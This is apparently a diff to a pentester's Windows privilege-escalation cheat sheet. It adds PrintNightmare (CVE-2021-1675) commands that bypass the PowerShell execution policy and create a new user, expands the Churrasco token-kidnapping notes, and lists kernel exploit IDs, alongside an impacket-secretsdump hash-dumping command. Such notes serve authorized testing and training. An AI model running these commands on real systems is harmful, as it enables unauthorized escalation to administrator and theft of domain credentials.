@@ -50,10 +50,10 @@ Dumping hashes from attack machine:
 impacket-secretsdump domain.local/username@10.10.10.10 -just-dc
 ```
 
-###### Token Kidnapping on Windows Server 2003
+###### Token Kidnapping on Windows Server 2003 / 2008 with Churrasco
 
 ```
-If SeImpersonatePrivilege is Enabled, this will probably work.
+If you are Network Service or Local Service and SeImpersonatePrivilege is Enabled, this will probably work.
 
 > git clone https://github.com/Re4son/Churrasco
 after uploading the exe:
@@ -111,11 +111,20 @@ schtasks /query /fo LIST /v
 tasklist /SVC
 ```
 
-###### Kernel Exploits
+###### PrintNightmare
 ```
-MS10-059 (tcmwinprivesc)
-MS16-032 (empire)
-(find some more recent as well)
+https://github.com/calebstewart/CVE-2021-1675/
+
+Run with (in powershell):
+> powershell -exec bypass -command "& { Import-Module .\CVE-2021-1675.ps1; Invoke-Nightmare; }"
+> Invoke-Nightmare -NewUser "username" -NewPassword "password" -DriverName "PrintMe"
+```
+
+###### Windows (Kernel) Exploits
+```
+MS10-059 (SecWiki)
+MS16-032 (Use the one from Empire)
+MS15-051 (Secwiki)
 ```
 
 ###### Kernel Exploits ~ Resources
